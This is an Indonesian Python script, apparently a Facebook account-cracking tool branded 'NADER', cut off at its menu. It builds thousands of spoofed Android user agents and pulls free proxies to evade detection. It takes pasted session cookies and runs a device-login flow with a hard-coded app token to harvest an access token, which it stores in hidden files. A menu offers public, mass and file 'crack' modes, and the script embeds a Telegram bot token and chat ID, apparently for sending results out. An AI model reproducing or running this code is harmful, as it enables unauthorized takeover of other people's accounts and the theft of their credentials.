import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
try:
        import rich
except ImportSena:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip uninstall requests && pip install requests && pip install mechanize ')
#logika--tahun#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#------------------[ NADER ]-------------------#
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
uman,usman1=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
printcp=[]
oks=[]
cps=[]
redmi=[]
ugent=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mXyzonXD')
prox=open('.prox.txt','r').read().splitlines()
###----------[ NADER ]---------- ###
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[ NADER ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ NADER ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ NADER ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ NADER ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
domris = random.choice(['bold blue','bold green','bold yellow'])

try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FF00"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
#--------------------[ NADER ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
ID="1350971290"
tok="6428563721:AAG4sOU4onVks2yjDK4z9O1PFEr3C3egPjM"

hour = datetime.datetime.now().hour
#--> Pengkondisian Jam Untuk Salam Harian
if hour < 4:
  hhl = f"Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = f"Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Pagi"
elif 15 <= hour < 17:
  hhl = f"Selamat Sore"
elif 17 <= hour < 18:
  hhl = f"Selamat Sore"
else:
  hhl = f"Selamat Malam"
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ NADER ]-----------------#
def banner():
	clear()
	cetak(nel(f'''{K2}   

         \033[1;32md8b   db  .d8b.  d8888b. d88888b d8888b.
         \033[1;31m888o  88 d8' `8b 88  `8D 88'     88  `8D
         \033[1;33m88V8o 88 88ooo88 88   88 88ooooo 88oobY'
         \033[1;34m88 V8o88 88~~~88 88   88 88~~~~~ 88`8b
         \033[1;35m88  V888 88   88 88  .8D 88.     88 `88.
         \033[1;36mVP   V8P YP   YP Y8888D' Y88888P 88   YD
                 ''',width=79,title=f'[bold green]NADER',style='bold hot_pink2'))
#--------------------[ NADER ]--------------#
                 
import requests,json,re
ses = requests.Session()
#def loginraf():
#	clear()
#	banner()
#	tree = Tree(' ')
#	tree.add(f'{h}1.  {P} CRACK NO LOGIN'):	tree.add(f'{h}2. {P} CRACK LOGIN COOKIE')
#	tree.add(f'{h}0. {P} EXIT')
#	cetak(tree)
#	RAF_MKZ = input(f'{M} ╰─ {P}PILIH : ')
#	if RAF_MKZ in ['1','01']:
#		lainnya()
#	if RAF_MKZ in ['2','02']:
#		login()
#	elif RAF_MKZ in ['0','00']:
#		exit()
#	else :
#		print(f'╰─ PILIH YG BENAR BANG')
#		time.sleep(5)
#		back()
#
def login():
	os.system('clear')
	banner()
	print(' ')
	#print(f' {H}[1]bo krak bnwsa 1')
	opt = (f'1')
	if opt =='1':
		os.system('pip uninstall requests -y && pip install requests')
	login1()
def login1():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		your_cookies = input(' ╰─   Paste cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ╰─  Login sucses | again run the tool");exit()

			except Exception as e:

				print(" ╰─  Cookies wrong")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
#------------------[ NADER ]----------------#
from rich.console import Console
from rich.table import Table
def menu(my_name,my_id):
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
		
	except IOError:
		print('[×] Cookies expered ')
		time.sleep(6)
		login_lagi334()
	os.system('clear')
	banner()
	table=Table()
	table.add_column("NO",width=11,justify="center",style="white")
	table.add_column("MENU",justify="center",width=44,style= "green")
	table.add_column("STATUS",justify="center",width=18,style="white")
	table.add_row("01","𝐶𝑅𝐴𝐶𝐾 PUBLICE","ONLINE")
	table.add_row("02","ᴄʀᴀᴄᴋ ᴍᴀssᴀʟ","ONLINE")
	table.add_row("03","ᴄʀᴀᴄᴋ ғɪʟᴇ","ONLINE")
